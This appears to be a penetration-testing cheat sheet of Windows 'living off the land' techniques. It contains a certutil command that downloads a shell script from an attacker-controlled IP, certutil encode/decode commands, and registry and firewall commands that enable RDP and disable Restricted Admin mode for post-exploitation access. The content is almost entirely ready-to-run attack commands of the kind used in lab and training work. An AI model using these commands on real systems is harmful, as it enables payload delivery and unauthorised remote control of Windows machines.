# Living off the Land

## File Transfers

| **Command**                                                                   | **Description**             |
| ----------------------------------------------------------------------------- | --------------------------- |
| `certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat` | Transfer file with certutil |
| `certutil -encode file1 encodedfile`                                          | Encode file with certutil   |
| `certutil -decode encodedfile file2`                                          | Decode file with certutil   |

***

## Enabling RDP (Requires local Administrator)

If you have control over a `local Administrator` account, you can enable RDP and use `xfreerdp` to perform `post-exploitation` in better conditions

To do so, follow these steps:

1. enable RDP: `reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`
2. enable RDP from the firewall config: `netsh advfirewall firewall set rule group="remote desktop" new enable=Yes`
3. disable the restricted admin mode: `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`

Then, login using: `xfreerdp /v:Target-IP /u:AdminUser /p:password`
